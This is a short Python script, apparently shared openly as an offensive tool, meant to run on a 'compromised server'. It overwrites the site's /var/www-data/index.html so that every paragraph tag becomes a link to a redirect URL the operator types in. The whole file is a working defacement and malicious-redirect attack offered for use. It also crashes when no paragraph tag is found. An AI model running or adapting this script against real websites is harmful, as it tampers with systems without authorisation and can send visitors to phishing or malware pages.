#!/usr/bin/env python3
# created 22 May 2021 by cysec0x67
# license: MIT license
# run as python script in cli against linux/unix-like.

# this script will find the index.html file on a compromised server and replace any
# paragraphs <p> with a link to whatever ip you input

# ask for ip address to link the html file to
print("Redirect-ip (include https://)")
ip = input(": ")

# open host index.html file and read to $index
with open('/var/www-data/index.html', 'r') as index_file:
	index = index_file.read()
print('\n***Original file: ***\n')
print(index)

# replace any paragraphs in $index to a link $ip and save to new file
word = '<p>'
if word in index:
	index_2 = index.replace(word, f'<a href="{ip}">')
else:
	print("Not found")

print('\n***New file: ***\n')
print(index_2)

# write the new file to the original html file
with open('/var/www-data/index.html', 'w') as index_file_2:
	index_file_2.write(str(index_2))

print("\n***Process complete***\n")